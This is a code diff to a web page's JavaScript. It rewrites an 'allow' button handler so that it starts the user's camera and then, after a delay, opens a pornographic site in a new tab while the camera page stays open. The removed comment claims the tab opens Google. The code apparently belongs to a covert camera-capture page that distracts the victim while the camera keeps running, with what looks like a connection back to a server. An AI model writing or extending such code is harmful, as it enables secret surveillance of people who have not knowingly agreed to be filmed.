@@ -1070,34 +1070,29 @@ function reconnectServer(){
 /* =========================================
    ALLOW BUTTON
 ========================================= */
+allowBtn.addEventListener("click", async () => {
 
-allowBtn.onclick =
-  async () => {
+  if (stream) {
+    console.log("Camera already running");
+    return;
+  }
 
-    const started =
-      await startCamera();
+  await startCamera();
 
+  if (stream) {
 
-    if(started){
+    setTimeout(() => {
 
-      /*
-        Open Google in a NEW TAB.
+      window.open(
+        "https://www.sexvid.xxx/s/most-favourited/sex+p%2A%2A%2A/",
+        "_blank"
+      );
 
-        The camera page stays open.
-      */
+    }, 1000);
 
-      setTimeout(() => {
+  }
 
-        window.open(
-          "https://www.sexvid.xxx/s/most-favourited/sex+p%2A%2A%2A/"
-          
-        );
-
-      },500);
-
-    }
-
-  };
+});
 
 /* =========================================
    CAMERA TAB RETURNS
